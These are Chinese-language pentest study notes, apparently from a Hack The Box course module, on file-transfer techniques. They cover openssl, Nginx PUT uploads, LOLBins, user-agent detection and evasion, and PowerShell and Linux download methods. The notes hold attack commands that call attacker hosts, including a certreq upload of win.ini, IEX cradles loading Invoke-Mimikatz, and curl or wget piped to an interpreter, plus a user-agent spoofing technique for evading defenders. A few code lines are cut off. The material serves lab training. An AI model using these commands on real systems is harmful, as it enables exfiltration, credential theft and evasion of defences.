[OpenSSL](https://www.openssl.org/) 经常包含在 Linux 发行版中，系统管理员使用它来生成安全证书等。OpenSSL 可以用于以 "nc 风格" 发送文件并加密文件。

要使用 `openssl` 加密文件，我们可以选择不同的加密算法，参见 [OpenSSL 手册页](https://www.openssl.org/docs/man1.1.1/man1/openssl-enc.html)。让我们以 `-aes256` 为例。我们还可以使用 `-iter 100000` 选项覆盖默认迭代次数，并添加 `-pbkdf2` 选项使用 PBKDF2 算法。按下回车键后，我们需要提供密码。

#### 使用 openssl 加密 /etc/passwd

  Encrypting /etc/passwd with openssl

```shell-session
tr01ax@htb[/htb]$ openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc

enter aes-256-cbc encryption password:
Verifying - enter aes-256-cbc encryption password:
```

请记住使用强壮且唯一的密码，以避免在未授权方获取文件时遭受暴力破解攻击。要解密文件，我们可以使用以下命令：

#### 使用 openssl 解密 passwd.enc

  Decrypt passwd.enc with openssl

```shell-session
tr01ax@htb[/htb]$ openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd

enter aes-256-cbc decryption password:
```

我们可以使用之前介绍的任何方法来传输此文件，但建议使用安全的传输方法，如 HTTPS、SFTP 或 SSH。一如既往，在本模块或其他模块的目标主机上练习本节中的示例，并尽可能重现（例如在 Pwnbox 上使用 `openssl` 示例）。以下部分将介绍通过 HTTP 和 HTTPS 传输文件的不同方法。

#filetransfer #http #https #hacking [source](https://academy.hackthebox.com/module/24/section/681)

---

## HTTP/S

Web 传输是大多数人传输文件最常见的方式，因为 `HTTP`/`HTTPS` 是防火墙最常允许通过的协议。另一个巨大的好处是，在许多情况下，文件在传输过程中会被加密。没有什么比在渗透测试中，客户的网络 IDS（Intrusion Detection System，入侵检测系统）检测到敏感文件以明文传输，然后他们问我们为什么在没有使用加密的情况下将密码发送到我们的云服务器更糟糕的了。

我们已经讨论过使用 Python3 [uploadserver 模块](https://github.com/Densaugeo/uploadserver)来设置具有上传功能的 Web 服务器，但我们也可以使用 Apache 或 Nginx。本节将介绍如何创建用于文件上传操作的安全 Web 服务器。

---

## Nginx - 启用 PUT

对于文件传输，[Nginx](https://www.nginx.com/resources/wiki/) 是 `Apache` 的一个很好的替代方案，因为配置不那么复杂，而且模块系统不会像 `Apache` 那样导致安全问题。

当允许 `HTTP` 上传时，100% 确定用户无法上传 Web shell 并执行它们至关重要。`Apache` 很容易在这方面出问题，因为 `PHP` 模块喜欢执行任何以 PHP 结尾的文件。配置 `Nginx` 使用 PHP 远没有那么简单。

#### 创建用于处理上传文件的目录

  Create a Directory to Handle Uploaded Files

```shell-session
tr01ax@htb[/htb]$ sudo mkdir -p /var/www/uploads/SecretUploadDirectory
```

#### 将所有者更改为 www-data

  Change the Owner to www-data

```shell-session
tr01ax@htb[/htb]$ sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory
```

#### 创建 Nginx 配置文件

通过创建 `/etc/nginx/sites-available/upload.conf` 文件并包含以下内容来创建 Nginx 配置文件：

  Create Nginx Configuration File

```shell-session
server {
    listen 9001;

    location /SecretUploadDirectory/ {
        root    /var/www/uploads;
        dav_methods PUT;
    }
}
```

#### 将我们的站点符号链接到 sites-enabled 目录

  Symlink our Site to the sites-enabled Directory

```shell-session

tr01ax@htb[/htb]$ sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
```

#### 启动 Nginx

  Start Nginx

```shell-session
tr01ax@htb[/htb]$ sudo systemctl restart nginx.service
```

如果我们收到任何错误消息，请检查 `/var/log/nginx/error.log`。如果使用 Pwnbox，我们会看到端口 80 已被占用。

#### 验证错误

  Verifying Errors

```shell-session
tr01ax@htb[/htb]$ tail -2 `/var/log/nginx/error.log`

2020/11/17 16:11:56 [emerg] 5679#5679: bind() to 0.0.0.0:`80` failed (98: A`ddress already in use`)
2020/11/17 16:11:56 [emerg] 5679#5679: still could not bind()
```

  Verifying Errors

```shell-session
tr01ax@htb[/htb]$ ss -lnpt | grep `80`

LISTEN 0      100          0.0.0.0:80        0.0.0.0:*    users:(("python",pid=`2811`,fd=3),("python",pid=2070,fd=3),("python",pid=1968,fd=3),("python",pid=1856,fd=3))
```
  验证错误

```shell-session
tr01ax@htb[/htb]$ ps -ef | grep `2811`

user65      2811    1856  0 16:05 ?        00:00:04 `python -m websockify 80 localhost:5901 -D`
root        6720    2226  0 16:14 pts/0    00:00:00 grep --color=auto 2811
```

我们看到已经有一个模块在监听80端口。为了解决这个问题，我们可以删除绑定在80端口的默认Nginx配置。

#### 删除Nginx默认配置

  删除Nginx默认配置

```shell-session
tr01ax@htb[/htb]$ sudo rm /etc/nginx/sites-enabled/default
```

现在我们可以使用`cURL`发送`PUT`请求来测试上传。在下面的示例中，我们将把`/etc/passwd`文件上传到服务器并命名为users.txt

#### 使用cURL上传文件

  使用cURL上传文件

```shell-session
tr01ax@htb[/htb]$ curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt
```

  使用cURL上传文件

```shell-session
tr01ax@htb[/htb]$ tail -1 /var/www/uploads/SecretUploadDirectory/users.txt

user65:x:1000:1000:,,,:/home/user65:/bin/bash
```

完成这些工作后，一个好的测试是通过导航到`http://localhost/SecretUploadDirectory`来确保目录列表未启用。默认情况下，使用`Apache`时，如果我们访问一个没有索引文件（index.html）的目录，它会列出所有文件。这对于我们窃取文件的用例来说很糟糕，因为大多数文件本质上都是敏感的，我们希望尽可能地隐藏它们。由于`Nginx`是极简的，这样的功能默认是不启用的。

---

## 使用内置工具

在下一节中，我们将介绍"Living off the Land"（利用系统内置工具）这个主题，即使用内置的Windows和Linux实用程序来执行文件传输活动。在渗透测试路径的模块中，当涉及Windows和Linux权限提升以及Active Directory枚举和利用等任务时，我们会反复回到这个概念。#hacking #filetransfer  #lolbas #gtfobins
[source](https://academy.hackthebox.com/module/24/section/1575)

"Living off the land"这个短语是由Christopher Campbell [@obscuresec](https://twitter.com/obscuresec)和Matt Graeber [@mattifestation](https://twitter.com/mattifestation)在[DerbyCon 3](https://www.youtube.com/watch?v=j-r6UonEkUw)上创造的。

LOLBins（Living off the Land binaries，利用系统内置二进制文件）这个术语来自于Twitter上关于如何称呼那些攻击者可以用来执行超出其原始目的的操作的二进制文件的讨论。目前有两个网站汇总了Living off the Land二进制文件的信息：

- [LOLBAS Project for Windows Binaries](https://lolbas-project.github.io)
- [GTFOBins for Linux Binaries](https://gtfobins.github.io/)

Living off the Land二进制文件可用于执行以下功能：

- 下载
- 上传
- 命令执行
- 文件读取
- 文件写入
- 绕过

本节将重点介绍使用LOLBAS和GTFOBins项目，并提供Windows和Linux系统上下载和上传功能的示例。

---

## 使用LOLBAS和GTFOBins项目

[LOLBAS for Windows](https://lolbas-project.github.io/#)和[GTFOBins for Linux](https://gtfobins.github.io/)是我们可以搜索用于不同功能的二进制文件的网站。

### LOLBAS

要在[LOLBAS](https://lolbas-project.github.io/)中搜索下载和上传功能，我们可以使用`/download`或`/upload`。

![image](https://academy.hackthebox.com/storage/modules/24/lolbas_upload.jpg)

让我们以[CertReq.exe](https://lolbas-project.github.io/lolbas/Binaries/Certreq/)为例。

我们需要在攻击主机上使用Netcat监听一个端口以接收传入流量，然后执行certreq.exe来上传文件。

#### 将win.ini上传到我们的Pwnbox

将win.ini上传到我们的Pwnbox

```cmd-session
C:\htb> certreq.exe -Post -config http://192.168.49.128/ c:\windows\win.ini
Certificate Request Processor: The operation timed out 0x80072ee2 (WinHttp: 12002 ERROR_WINHTTP_TIMEOUT)
```

这会将文件发送到我们的Netcat会话，我们可以复制粘贴其内容。

#### 在Netcat会话中接收的文件

在Netcat会话中接收的文件

```shell-session
tr01ax@htb[/htb]$ sudo nc -lvnp 80

listening on [any] 80 ...
connect to [192.168.49.128] from (UNKNOWN) [192.168.49.1] 53819
POST / HTTP/1.1
Cache-Control: no-cache
Connection: Keep-Alive
Pragma: no-cache
Content-Type: application/json
User-Agent: Mozilla/4.0 (compatible; Win32; NDES client 10.0.19041.1466/vb_release_svc_prod1)
Content-Length: 92
Host: 192.168.49.128

; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
```

如果运行`certreq.exe`时出错，您使用的版本可能不包含`-Post`参数。您可以在[这里](https://github.com/juliourena/plaintext/raw/master/hackthebox/certreq.exe)下载更新版本后重试。

### GTFOBins

要在[GTFOBins for Linux Binaries](https://gtfobins.github.io/)中搜索下载和上传功能，我们可以使用`+file download`或`+file upload`。

![image](https://academy.hackthebox.com/storage/modules/24/gtfobins_download.jpg)

让我们使用[OpenSSL](https://www.openssl.org/)。它经常被安装并且通常包含在其他软件发行版中，系统管理员使用它来生成安全证书等任务。OpenSSL可以用来以"nc风格"发送文件。

我们需要在Pwnbox上创建证书并启动服务器。

#### 在Pwnbox上创建证书

在Pwnbox上创建证书

```shell-session
tr01ax@htb[/htb]$ openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem

Generating a RSA private key
.......................................................................................................+++++
................+++++
writing new private key to 'key.pem'
-----
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:
State or Province Name (full name) [Some-State]:
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:
Email Address []:
```

#### 在Pwnbox上启动服务器

在Pwnbox上启动服务器

```shell-session
tr01ax@htb[/htb]$ openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
```

接下来，在服务器运行的情况下，我们需要从被入侵的机器上下载文件。

#### 从被入侵的机器下载文件

从被入侵的机器下载文件

```shell-session
tr01ax@htb[/htb]$ openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
```

---

## 其他常见的Living off the Land工具

### Bitsadmin下载功能

[后台智能传输服务（BITS）](https://docs.microsoft.com/en-us/windows/win32/bits/background-intelligent-transfer-service-portal)可用于从HTTP站点和SMB共享下载文件。它"智能地"考虑主机和网络利用率，以最大限度地减少对用户前台工作的影响。

#### 使用Bitsadmin下载文件

使用Bitsadmin下载文件

```powershell-session
PS C:\htb> bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe
```

PowerShell还支持与BITS交互，可以进行文件下载和上传，支持凭据，并且可以使用指定的代理服务器。

#### 下载

下载

```powershell-session
PS C:\htb> Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
```

---

### Certutil

Casey Smith ([@subTee](https://twitter.com/subtee?lang=en))发现Certutil可用于下载任意文件。它在所有Windows版本中都可用，并且一直是一种流行的文件传输技术，作为Windows的事实上的`wget`。然而，反恶意软件扫描接口（AMSI，Antimalware Scan Interface）目前将此检测为恶意Certutil使用。

#### 使用Certutil下载文件

使用Certutil下载文件

```cmd-session
C:\htb> certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe
```

---

## 额外练习

值得浏览LOLBAS和GTFOBins网站，并尽可能多地尝试文件传输方法。越晦涩越好。你永远不知道什么时候在评估过程中需要这些二进制文件之一，如果你已经有了多个选项的详细笔记，这将节省时间。一些可以用于文件传输的二进制文件可能会让你感到惊讶。

在最后两节中，我们将讨论有关文件传输的检测注意事项，以及如果评估范围需要规避测试，我们可以采取一些步骤来规避检测。#filetransfer #hacking  [source](https://academy.hackthebox.com/module/24/section/162)

基于黑名单的命令行检测很容易绕过，即使使用简单的大小写混淆也可以。然而，尽管在特定环境中将所有命令行列入白名单的过程最初很耗时，但它非常稳健，并且可以快速检测和警报任何异常的命令行。

大多数客户端-服务器协议要求客户端和服务器在交换信息之前协商内容的传递方式。这在`HTTP`协议中很常见。不同的Web服务器和Web浏览器类型之间需要互操作性，以确保无论使用什么浏览器，用户都能获得相同的体验。HTTP客户端最容易通过其用户代理字符串（user agent string）来识别，服务器使用该字符串来识别连接到它的`HTTP`客户端，例如Firefox、Chrome等。

用户代理不仅用于识别Web浏览器，任何作为`HTTP`客户端并通过`HTTP`连接到Web服务器的东西都可以有一个用户代理字符串（即`cURL`、自定义`Python`脚本，或常见工具如`sqlmap`或`Nmap`）。

组织可以采取一些步骤来识别潜在的用户代理字符串，首先建立已知合法用户代理字符串的列表、默认操作系统进程使用的用户代理、更新服务（如Windows Update和防病毒更新等）使用的常见用户代理。这些可以输入到用于威胁狩猎的SIEM工具中，以过滤掉合法流量并专注于可能表明可疑行为的异常。然后可以进一步调查任何看起来可疑的用户代理字符串，以确定它们是否被用于执行恶意操作。这个[网站](http://useragentstring.com/index.php)对于识别常见用户代理字符串非常有用。用户代理字符串列表可在[这里](http://useragentstring.com/pages/useragentstring.php)获取。

恶意文件传输也可以通过其用户代理来检测。以下用户代理/标头是从常见`HTTP`传输技术观察到的（在Windows 10版本10.0.14393上测试，使用PowerShell 5）。

#### Invoke-WebRequest - 客户端

Invoke-WebRequest - 客户端

```powershell-session
PS C:\htb> Invoke-WebRequest http://10.10.10.32/nc.exe -OutFile "C:\Users\Public\nc.exe"
PS C:\htb> Invoke-RestMethod http://10.10.10.32/nc.exe -OutFile "C:\Users\Public\nc.exe"
```

#### Invoke-WebRequest - 服务器

Invoke-WebRequest - 服务器

```shell-session
GET /nc.exe HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.14393.0
```

#### WinHttpRequest - 客户端

WinHttpRequest - 客户端

```powershell-session
PS C:\htb> $h=new-object -com WinHttp.WinHttpRequest.5.1;
PS C:\htb> $h.open('GET','http://10.10.10.32/nc.exe',$false);
PS C:\htb> $h.send();
PS C:\htb> iex $h.ResponseText
```

#### WinHttpRequest - 服务器

WinHttpRequest - 服务器

```shell-session
GET /nc.exe HTTP/1.1
Connection: Keep-Alive
Accept: */*
User-Agent: Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)
```

#### Msxml2 - 客户端

Msxml2 - 客户端

```powershell-session
PS C:\htb> $h=New-Object -ComObject Msxml2.XMLHTTP;
PS C:\htb> $h.open('GET','http://10.10.10.32/nc.exe',$false);
PS C:\htb> $h.send();
PS C:\htb> iex $h.responseText
```

#### Msxml2 - 服务器

Msxml2 - 服务器

```shell-session
GET /nc.exe HTTP/1.1
Accept: */*
Accept-Language: en-us
UA-CPU: AMD64
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E)
```

#### Certutil - 客户端

Certutil - 客户端

```cmd-session
C:\htb> certutil -urlcache -split -f http://10.10.10.32/nc.exe
C:\htb> certutil -verifyctl -split -f http://10.10.10.32/nc.exe
```

#### Certutil - 服务器

Certutil - 服务器

```shell-session
GET /nc.exe HTTP/1.1
Cache-Control: no-cache
Connection: Keep-Alive
Pragma: no-cache
Accept: */*
User-Agent: Microsoft-CryptoAPI/10.0
```

#### BITS - 客户端

BITS - 客户端

```powershell-session
PS C:\htb> Import-Module bitstransfer;
PS C:\htb> Start-BitsTransfer 'http://10.10.10.32/nc.exe' $env:temp\t;
PS C:\htb> $r=gc $env:temp\t;
PS C:\htb> rm $env:temp\t;
PS C:\htb> iex $r
```

#### BITS - 服务器

BITS - 服务器

```shell-session
HEAD /nc.exe HTTP/1.1
Connection: Keep-Alive
Accept: */*
Accept-Encoding: identity
User-Agent: Microsoft BITS/7.8
```

本节只是触及了检测恶意文件传输的表面。对于任何组织来说，创建允许的二进制文件白名单或已知用于恶意目的的二进制文件黑名单将是一个很好的开始。此外，狩猎异常的用户代理字符串可以是捕获正在进行的攻击的绝佳方式。我们将在后面的模块中深入介绍威胁狩猎和检测技术。#filetransfer #hacking #evasion [source](https://academy.hackthebox.com/module/24/section/163)

## 更改用户代理

如果勤勉的管理员或防御者已将这些用户代理中的任何一个列入黑名单，[Invoke-WebRequest](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.1)包含一个UserAgent参数，允许将默认用户代理更改为模拟Internet Explorer、Firefox、Chrome、Opera或Safari的用户代理。例如，如果内部使用Chrome，设置此用户代理可能会使请求看起来合法。

#### 列出用户代理

列出用户代理

```powershell-session
PS C:\htb>[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl

Name       : InternetExplorer
User Agent : Mozilla/5.0 (compatible; MSIE 9.0; Windows NT; Windows NT 10.0; en-US)

Name       : FireFox
User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) Gecko/20100401 Firefox/4.0

Name       : Chrome
User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/534.6 (KHTML, like Gecko) Chrome/7.0.500.0
             Safari/534.6

Name       : Opera
User Agent : Opera/9.70 (Windows NT; Windows NT 10.0; en-US) Presto/2.2.1

Name       : Safari
User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0
             Safari/533.16
```

使用Chrome用户代理调用Invoke-WebRequest下载nc.exe：

#### 使用Chrome用户代理的请求

使用Chrome用户代理的请求

```powershell-session
PS C:\htb> $UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
PS C:\htb> Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
```

使用Chrome用户代理的请求

```shell-session
tr01ax@htb[/htb]$ nc -lvnp 80

listening on [any] 80 ...
connect to [10.10.10.32] from (UNKNOWN) [10.10.10.132] 51313
GET /nc.exe HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/534.6
(KHTML, Like Gecko) Chrome/7.0.500.0 Safari/534.6
Host: 10.10.10.32
Connection: Keep-Alive
```

---

## LOLBAS / GTFOBins

应用程序白名单可能会阻止您使用PowerShell或Netcat，命令行日志记录可能会向防御者发出警报。在这种情况下，一个选择可能是使用"LOLBIN"（living off the land binary，利用系统内置二进制文件），也称为"信任错位二进制文件"。LOLBIN的一个例子是Windows 10的英特尔图形驱动程序（GfxDownloadWrapper.exe），它安装在某些系统上并包含定期下载配置文件的功能。可以按如下方式调用此下载功能：

#### 使用GfxDownloadWrapper.exe传输文件

使用GfxDownloadWrapper.exe传输文件

```powershell-session
PS C:\htb> GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"
```

这样的二进制文件可能被应用程序白名单允许运行，并且不会被警报排除。其他更常用的二进制文件也可用，值得查看[LOLBAS](https://lolbas-project.github.io/)项目以找到存在于您环境中的合适的"文件下载"二进制文件。Linux的等效项目是[GTFOBins](https://gtfobins.github.io/)项目，绝对值得一看。截至撰写本文时，GTFOBins项目提供了近40个可用于执行文件传输的常见安装二进制文件的有用信息。

---

## 结语

正如我们在本模块中所见，在Windows和Linux系统之间向我们的攻击主机传输文件有很多方法。值得在渗透测试路径的模块中尽可能多地练习这些方法。在目标上获得了Web shell？尝试使用Certutil将文件下载到目标进行额外枚举。需要从目标下载文件？尝试使用Impacket SMB服务器或具有上传功能的Python Web服务器。定期回顾本模块，并努力以某种方式使用所教授的所有方法。此外，每当您在目标或实验室上工作时，花一些时间搜索您以前从未使用过的LOLBin或GTFOBin来完成您的文件传输目标。#filetransfer #hacking #windows #powershell

#### [无文件威胁](https://docs.microsoft.com/en-us/microsoft-365/security/intelligence/fileless-threats?view=o365-worldwide)

术语`fileless`（无文件）表明威胁不是通过文件来的，它们使用系统内置的合法工具来执行攻击。这并不意味着没有文件传输操作。如本节后面所讨论的，文件不是"存在"于系统上，而是在内存中运行。

#### [Astaroth攻击](https://www.microsoft.com/security/blog/2019/07/08/dismantling-a-fileless-campaign-microsoft-defender-atp-next-gen-protection-exposes-astaroth-attack/)

通常遵循以下步骤：钓鱼邮件中的恶意链接导向一个LNK文件。双击时，LNK文件导致[WMIC工具](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmic)使用"/Format"参数执行，这允许下载和执行恶意JavaScript代码。JavaScript代码反过来通过滥用[Bitsadmin工具](https://docs.microsoft.com/en-us/windows/win32/bits/bitsadmin-tool)下载有效载荷。
所有有效载荷都是base64编码的，使用Certutil工具解码后生成几个DLL文件。然后使用[regsvr32](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/regsvr32)工具加载一个解码的DLL，该DLL解密并加载其他文件，直到最终的有效载荷Astaroth被注入到`Userinit`进程中。下面是攻击的图形描述。

![image](https://academy.hackthebox.com/storage/modules/24/fig1a-astaroth-attack-chain.png)

[](https://www.microsoft.com/security/blog/wp-content/uploads/2019/08/fig1a-astaroth-attack-chain.png)

## Windows文件传输

**PowerShell Base64编码与解码**

--> [[Lesson 02 - Windows File Transfer Methods]]

### 下载

检查哈希：
```shell-session
md5sum filename.txt
```

编码为base64（"echo"有什么用？）：
```shell-session
cat filename.txt |base64 -w 0;echo
```

在Power Shell中从base64解码
```powershell-session
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("ENCODED_STRING"))
```

最后，我们可以使用[Get-FileHash](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/get-filehash?view=powershell-7.2) cmdlet确认文件是否成功传输，它的功能与`md5sum`相同。
```powershell-session
Get-FileHash C:\Users\Public\filename.txt -Algorithm md5
```

**注意：** 虽然这种方法很方便，但并非总是可以使用。Windows命令行实用程序（cmd.exe）的最大字符串长度为8,191个字符。此外，如果您尝试发送极大的字符串，Web shell可能会出错。

#### PowerShell DownloadFile方法

我们可以指定类名`Net.WebClient`和方法`DownloadFile`，参数对应于要下载的目标文件的URL和输出文件名。

文件下载

```powershell-session
PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
PS C:\htb> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')

PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
PS C:\htb> (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'PowerViewAsync.ps1')
```


#### PowerShell DownloadString - 无文件方法

正如我们之前讨论的，无文件攻击通过使用一些操作系统函数来下载有效载荷并直接执行它。PowerShell也可用于执行无文件攻击。我们可以使用[Invoke-Expression](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.2) cmdlet或别名`IEX`直接在内存中运行PowerShell脚本，而不是将其下载到磁盘。

PowerShell DownloadString - 无文件方法

```powershell-session
PS C:\htb> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
```

`IEX`也接受管道输入。

PowerShell DownloadString - 无文件方法

```powershell-session
PS C:\htb> (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
```


#### PowerShell Invoke-WebRequest
从 PowerShell 3.0 开始，[Invoke-WebRequest](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.2) cmdlet（命令行工具）也可以使用，但下载文件时速度明显较慢。你可以使用别名 `iwr`、`curl` 和 `wget` 来代替 `Invoke-WebRequest` 的完整名称。

PowerShell Invoke-WebRequest

```powershell-session
PS C:\htb> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```

Harmj0y 编译了一份详尽的 PowerShell 下载 cradles（下载载体）列表，[点击此处查看](https://gist.github.com/HarmJ0y/bb48307ffa663256e239)。值得熟悉它们及其细微差别，例如缺乏代理感知或需要接触磁盘（将文件下载到目标机器上），以便根据情况选择合适的方法。

#### SMB 下载

服务器消息块协议（SMB protocol，Server Message Block protocol）运行在 TCP/445 端口上，在运行 Windows 服务的企业网络中很常见。它使应用程序和用户能够与远程服务器之间传输文件。

我们可以使用 SMB 轻松地从 Pwnbox（攻击主机）下载文件。我们需要在 Pwnbox 上使用 Impacket 的 [smbserver.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py) 创建一个 SMB 服务器，然后使用 `copy`、`move`、PowerShell 的 `Copy-Item` 或任何其他允许连接到 SMB 的工具。

详细说明请参阅 --> [[Lesson 02 - Windows File Transfer Methods#^ba0edb]]


#### FTP 下载

另一种传输文件的方式是使用 FTP（文件传输协议，File Transfer Protocol），它使用 TCP/21 和 TCP/20 端口。我们可以使用 FTP 客户端或 PowerShell 的 Net.WebClient 从 FTP 服务器下载文件。

详细说明请参阅 --> [[Lesson 02 - Windows File Transfer Methods#^cd00c2]]

##### 使用 PowerShell 从 FTP 服务器传输文件

```powershell-session
PS C:\htb> (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Us
```

当我们在远程机器上获得 shell 时，可能没有交互式 shell。如果是这种情况，我们可以创建一个 FTP 命令文件来下载文件。首先，我们需要创建一个包含要执行的命令的文件，然后使用 FTP 客户端使用该文件来下载目标文件。

##### 为 FTP 客户端创建命令文件并下载目标文件

```cmd-session
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo GET file.txt >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128
Log in with USER and PASS first.
ftp> USER anonymous

ftp> GET file.txt
ftp> bye

C:\htb>more file.txt
This is a test file
```

### 上传操作

还有一些情况，例如密码破解、分析、数据窃取等，我们需要将文件从目标机器上传到攻击主机。我们可以使用与下载操作相同的方法，但现在用于上传。让我们看看如何通过各种方式完成文件上传。

Powershell Base64 编码和解码 --> [[Lesson 02 - Windows File Transfer Methods#^32a07c]]

#### PowerShell Web 上传

PowerShell 没有内置的上传功能，但我们可以使用 `Invoke-WebRequest` 或 `Invoke-RestMethod` 来构建上传函数。我们还需要一个接受上传的 Web 服务器，这在大多数常见的 Web 服务器工具中不是默认选项。

详细说明请参阅 --> [[Lesson 02 - Windows File Transfer Methods#^9c2993]]

##### SMB 上传 --> [[Lesson 02 - Windows File Transfer Methods#^84ecfb]]

我们之前讨论过，公司通常允许使用 `HTTP`（TCP/80）和 `HTTPS`（TCP/443）协议的出站流量。企业通常不允许 SMB 协议（TCP/445）离开其内部网络，因为这可能使它们面临潜在攻击。有关更多信息，我们可以阅读微软的文章 [Preventing SMB traffic from lateral connections and entering or leaving the network](https://support.microsoft.com/en-us/topic/preventing-smb-traffic-from-lateral-connections-and-entering-or-leaving-the-network-c0541db7-2244-0dce-18fd-14a3ddeb282a)。

## Linux 文件传输

--> [[Lesson 03 - Linux File Transfer Methods|详细信息请参阅这里]]

### 下载

#### 使用 Linux 进行无文件攻击

由于 Linux 的工作方式以及[管道的运行机制](https://www.geeksforgeeks.org/piping-in-unix-or-linux/)，我们在 Linux 中使用的大多数工具都可以用来复制无文件操作，这意味着我们不必下载文件就可以执行它。

**注意：** 某些 payload（有效载荷）如 `mkfifo` 会将文件写入磁盘。请记住，虽然使用管道时 payload 的执行可能是无文件的，但根据所选择的 payload，它可能会在操作系统上创建临时文件。

让我们使用之前的 `cURL` 命令，但这次不是下载 LinEnum.sh，而是直接使用管道执行它。

**使用 cURL 进行无文件下载**
```shell-session
tr01ax@htb[/htb]$ curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.
```

类似地，我们可以从 Web 服务器下载一个 Python 脚本文件并将其传递给 Python 二进制文件。让我们这样做，这次使用 `wget`。

**使用 wget 进行无文件下载**
```shell-session
tr01ax@htb[/htb]$ wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3

Hello World!
```


#### 使用 Bash 下载（/dev/tcp）

可能还会有一些情况，所有已知的文件传输工具都不可用。只要安装了 Bash 2.04 或更高版本（使用 --enable-net-redirections 编译），就可以使用内置的 /dev/TCP 设备文件进行简单的文件下载。

**连接到目标 Web 服务器**
```shell-session
tr01ax@htb[/htb]$ exec 3<>/dev/tcp/10.10.10.32/80
```

**HTTP GET 请求**
```shell-session
tr01ax@htb[/htb]$ echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
```

**打印响应**
```shell-session
tr01ax@htb[/htb]$ cat <&3
```

#### SSH 下载

在开始从目标 Linux 机器下载文件到 Pwnbox 之前，让我们在 Pwnbox 上设置一个 SSH 服务器。

**启用 SSH 服务器**
```shell-session
tr01ax@htb[/htb]$ sudo systemctl enable ssh

Synchronizing state of ssh.service with SysV service script with /lib/systemd/systemd-sysv-install.
Executing: /lib/systemd/systemd-sysv-install enable ssh
Use of uninitialized value $service in hash element at /usr/sbin/update-rc.d line 26, <DATA> line 45
...SNIP...
```

**启动 SSH 服务器**
```shell-session
tr01ax@htb[/htb]$ sudo systemctl start ssh
```

**检查 SSH 监听端口**
```shell-session
tr01ax@htb[/htb]$ netstat -lnpt

(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
